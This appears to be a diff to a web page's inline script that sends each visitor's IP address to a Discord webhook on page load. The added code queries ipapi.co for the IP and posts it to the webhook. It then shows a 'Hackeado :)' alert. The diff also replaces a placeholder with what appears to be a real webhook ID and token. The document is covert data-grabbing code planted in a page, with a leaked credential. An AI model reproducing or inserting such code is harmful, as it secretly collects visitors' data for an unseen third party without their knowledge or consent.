@@ -16,30 +16,30 @@
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
       // Define the Discord webhook URL
-      const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
-      const url = 'http://meuip.com/api/meuip.php';
+      const webhookUrl = 'https://discord.com/api/webhooks/819077000487501825/NBiHydYHPaB_4nELShtpR0mMhOLyJnDxXcaDBbGzB2wPdMqsoEuy1Z_3NpDP2Xrue6gh';
+      const url = 'https://ipapi.co/json/';
 
-      // Send a message to the Discord channel via webhook
-      $.ajax({
-        type: 'GET',
-        url: url,
-        xhrFields: {
-            withCredentials: true
-        },
-        contentType: 'application/json',
-        success: function (response){
-            $.ajax({
-                type: 'POST',
-                url: webhookUrl,
-                data: JSON.stringify({
-                  content: response.response
-                }),
-                contentType: 'application/json',
-                success: function() {
-                  alert('Hackeado :)')
-                }
-              });
-        }
-      });
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://ipapi.co/json/');
+      xhr.onload = function() {
+        // Parse the JSON response and display the IP address on the page
+        const data = JSON.parse(xhr.responseText);
+        $.ajax({
+          type: 'POST',
+          url: webhookUrl,
+          data: JSON.stringify({
+            content: data.ip
+          }),
+          contentType: 'application/json',
+          success: function() {
+            alert('Hackeado :)')
+          },
+          error: function(xhr, status, error) {
+            console.error(error);
+          }
+        });
+      };
+      xhr.send();
+      
      
     </script>
